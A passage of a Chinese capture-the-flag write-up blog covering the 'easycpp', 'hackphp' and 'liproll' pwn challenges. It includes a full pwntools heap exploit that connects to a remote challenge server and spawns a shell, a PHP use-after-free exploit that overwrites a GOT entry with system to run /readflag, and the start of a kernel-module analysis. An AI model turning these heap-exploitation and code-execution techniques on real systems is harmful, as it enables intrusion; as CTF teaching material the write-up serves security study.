0x10</code>大小，也就是指定大小的一半，接着再次<code>add</code>相同大小的内容，那么在<code>push</code>第一个字节的时候<code>vector</code>就会触发扩容操作，此时申请得到指定<code>size</code>大小的堆块，在<code>push</code>最后一个字节的时候又会触发一次扩容操作，此时会释放<code>size</code>大小的堆块而申请<code>size*2</code>的堆块</p><p>那么在进行<code>note</code>删除的时候就会释放结构体堆块，也就是<code>0x350</code>的堆块，此时由于<code>tcache</code>中有一个堆块了，因此这里第一个成员变量会被覆写为堆地址，也就是我们可以泄漏得到堆地址了。</p><p>做到泄漏堆地址之后<code>libc</code>地址的泄漏就好多了，还是利用相同的方法，在对<code>note2</code>进行<code>add</code>的时候申请指定大小的堆块即<code>0x350</code>大小的堆块，注意到此时申请的堆块就是<code>note1</code>的结构体堆块，调试过程中发现结构体偏移<code>0x1b0</code>位置残留有一个<code>malloc</code>的函数指针，利用字符串拼接和<code>show</code>函数泄漏该指针即可。</p><p>在得到<code>libc</code>基地址和<code>heap</code>地址之后就可以调用<code>clear</code>函数将<code>vector_current</code>指针指向<code>vector_start</code>位置，也就是<code>note1</code>结构体的函数指针位置，覆写该指针为<code>gadget</code>，调用即可<code>getshell</code>。</p><p>这里远程和本地的堆偏移好像不太一样相差了<code>0xc00</code>，不知道为什么。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./easycpp&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;source gdb_dbg&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>, <span class="number">0xe5617</span>, <span class="number">0xe561e</span>, <span class="number">0xe5622</span>, <span class="number">0x10a428</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.216.214&#x27;</span>, <span class="number">27807</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>, <span class="number">0xe5617</span>, <span class="number">0xe561e</span>, <span class="number">0xe5622</span>, <span class="number">0x10a428</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content, is_clear=<span class="literal">False</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> is_clear:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;to clear it?(y/N)&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;to clear it?(y/N)&quot;</span>, <span class="string">&quot;N&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;(q to quit):&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        p.sendline(i)</span><br><span class="line">    p.sendline(<span class="string">&quot;q&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backup</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encourage</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x55555576de60</span></span><br><span class="line"></span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a0</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(content)</span><br><span class="line">backup()</span><br><span class="line">save()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a0</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(content)</span><br><span class="line">delete()</span><br><span class="line">show()</span><br><span class="line">heap_address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a0</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(content)</span><br><span class="line">save()</span><br><span class="line">content = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    content.append(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    content.append(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(content)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;2&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc.address = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;heap address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(heap_address)))</span><br><span class="line">log.success(<span class="string">&quot;libc address is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">content = []</span><br><span class="line">content.append(p64(heap_address - <span class="number">0x2230</span> + <span class="number">0x8</span> - <span class="number">0xc00</span>))</span><br><span class="line">content.append(p64(one_gadget[<span class="number">2</span>] + libc.address))</span><br><span class="line"><span class="comment"># content.append(p64(libc.sym[&#x27;puts&#x27;]))</span></span><br><span class="line">add(content, <span class="literal">True</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;source gdb_dbg&quot;)</span></span><br><span class="line"></span><br><span class="line">encourage()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 0x55555576de60</span></span><br><span class="line"><span class="comment"># content = []</span></span><br><span class="line"><span class="comment"># for i in range(0x1a0):</span></span><br><span class="line"><span class="comment">#     content.append(&quot;1&quot;)</span></span><br><span class="line"><span class="comment"># add(content)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># backup()</span></span><br><span class="line"><span class="comment"># delete()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># content = []</span></span><br><span class="line"><span class="comment"># for i in range(0x1a0):</span></span><br><span class="line"><span class="comment">#     content.append(&quot;1&quot;)</span></span><br><span class="line"><span class="comment"># add(content)</span></span><br><span class="line"><span class="comment"># save()</span></span><br><span class="line"><span class="comment"># add(content)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># encourage()</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="hackphp"><a href="#hackphp" class="headerlink" title="hackphp"></a>hackphp</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>这是一个<code>webpwn</code>，程序给出了四种功能分别是<code>add,delete,edit,get</code>。其中<code>add</code>函数的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">zif_hackphp_create</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 size[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = execute_data-&gt;This.u2.next;</span><br><span class="line">  size[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(v2, &amp;unk_2000, size) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf = (<span class="type">char</span> *)_emalloc(size[<span class="number">0</span>]);</span><br><span class="line">    buf_size = size[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(size[<span class="number">0</span>] - <span class="number">0x100</span>) &lt;= <span class="number">0x100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        return_value-&gt;u1.type_info = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _efree();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return_value-&gt;u1.type_info = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>buf</code>是全局变量，然后可以看到这里在将申请的堆块的地址写入到<code>buf</code>位置之后又将申请得到的堆块释放掉了，因此之后会存在一个<code>UAF</code>漏洞。</p><p><code>php</code>中的空闲堆块的管理也是存在一个全局链表，相同大小的堆块释放之后就会存储到链表中，通过<code>fd</code>进行连接。因此这里我们可以利用<code>UAF</code>将堆块分配到<code>_efree.got</code>表位置，覆写其地址为<code>system</code>的地址，之后就可以执行<code>readflag</code>程序了。</p><p>但是这里使用其给出的<code>add</code>函数无法达到效果，因此其总是先申请之后再进行释放，也就是相同大小永远只申请第一个堆块。因此这里我们需要首先消耗掉一个堆块。这里采用的是<code>str_repeat</code>函数，该函数会申请我们传入参数长度大小的堆块。那么这里我们先使用<code>edit</code>函数覆写<code>fd</code>指针指向<code>_efree.got</code>的位置，接着连续申请两次并在第二次参数设置为为<code>system</code>即可覆写了。</p><p>这里还有个<code>libc/elf</code>基地址的问题，一般来说在<code>webpwn</code>中都可以直接加载<code>/proc/self/maps</code>直接得到地址。</p><h3 id="调试技巧"><a href="#调试技巧" class="headerlink" title="调试技巧"></a>调试技巧</h3><p><a href="https://www.anquanke.com/post/id/204404">参考</a></p><p>当我们启动<code>php</code>执行我们的脚本即<code>gdb exp.php</code>的时候如果直接设定参数运行无法下断点，因为此时<code>hackphp.so</code>还没有加载进来，我们遵循的方法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb php</span><br><span class="line">&gt; run</span><br><span class="line">&gt; crtl + c (signal 2)</span><br></pre></td></tr></table></figure><p>也就是说首先是<code>run</code>，此时<code>php</code>在等待我们的输入，这时输入<code>crtl + c</code>，那么此时就会断下来，并且此时已经加载了<code>hackphp.so</code>了。此时在设置参数<code>set args exp.php</code>，设置断点，再<code>run</code>，那么再次运行就会保留上次的断点，也就可以断下了</p><p>改题目中的<code>source</code>文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">b zif_hackphp_create</span><br><span class="line">b zif_hackphp_get</span><br><span class="line">b zif_hackphp_edit</span><br><span class="line">b zif_hackphp_delete</span><br><span class="line"><span class="built_in">set</span> args exp.php</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>启动之后<code>source gdb_dbg</code>， 之后再<code>crtl + c</code>就可以成功断下了。</p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="variable">$result</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$x</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span>(<span class="params"><span class="variable">$i</span>, <span class="variable">$x</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="variable">$x</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$i</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$ret</span>,<span class="variable">$sys</span>;</span><br><span class="line">    <span class="variable">$pattern1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc-2.31.so/&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20190902\/hackphp.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$buffer</span>, <span class="variable">$ret</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern1</span>, <span class="variable">$buffer</span>, <span class="variable">$sys</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;callback&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/proc/self/maps&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="variable">$base</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$ret</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"><span class="variable">$libc</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$sys</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">hackphp_create</span>(<span class="number">0x210</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">i2s</span>(<span class="variable">$base</span> + <span class="number">0x4178</span>-<span class="number">0x20</span>);</span><br><span class="line"><span class="title function_ invoke__">hackphp_edit</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;b&quot;</span>,<span class="number">0x210</span>-<span class="number">0x20</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">i2s</span>(<span class="variable">$base</span>+<span class="number">0x4070</span>),(<span class="number">0x210</span>-<span class="number">0x20</span>)/<span class="number">8</span>);</span><br><span class="line"><span class="comment">// sleep(5);</span></span><br><span class="line"><span class="title function_ invoke__">hackphp_edit</span>(<span class="title function_ invoke__">i2s</span>(<span class="variable">$libc</span>+<span class="number">0x55410</span>));</span><br><span class="line"><span class="title function_ invoke__">hackphp_create</span>(<span class="number">0x108</span>);</span><br><span class="line"><span class="title function_ invoke__">hackphp_edit</span>(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">hackphp_delete</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="liproll"><a href="#liproll" class="headerlink" title="liproll"></a>liproll</h2><p><code>kernelpwn</code></p><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>首先我们看一下启动的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">        -kernel ./bzImage \</span><br><span class="line">        -append <span class="string">&quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot;</span> \</span><br><span class="line">        -initrd ./rootfs.cpio \</span><br><span class="line">        -nographic \</span><br><span class="line">        -m 2G \</span><br><span class="line">        -s \</span><br><span class="line">        -smp cores=2,threads=2,sockets=1 \</span><br><span class="line">        -monitor /dev/null</span><br></pre></td></tr></table></figure><p>开启了<code>kaslr</code>，解压<code>rootfs.cpio</code>，看到其中的<code>init</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chown</span> -R root:root /bin /usr /root</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;flag&#123;this_is_a_test_flag&#125;&quot;</span> &gt; /root/flag</span><br><span class="line"><span class="built_in">chmod</span> -R 400 /root</span><br><span class="line"><span class="built_in">chmod</span> -R o-r /proc/kallsyms</span><br><span class="line"><span class="built_in">chmod</span> -R 755 /bin /usr</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /root/banner</span><br><span class="line">insmod /liproll.ko</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 777 /dev/liproll</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;sh end!\n&#x27;</span></span><br><span class="line">poweroff -d 1800000 -f &amp;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>也就是说<code>liproll.ko</code>就是包含漏洞的模块了，用<code>ida</code>分析一下，该模块提供了一些基本的函数，首先我们来看一下<code>ioctl</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">liproll_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    add();</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F04</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    show(a3);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F01</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F02</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        global_buffer = <span class="number">0LL</span>;</span><br><span class="line">        *(&amp;global_buffer + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cast_a_spell(a3);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据传入的<code>cmd</code>的不同调用了不同的函数。我们依次来看一下，首先是<code>add</code>函数，也就是<code>create_a_spell</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">create_a_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span 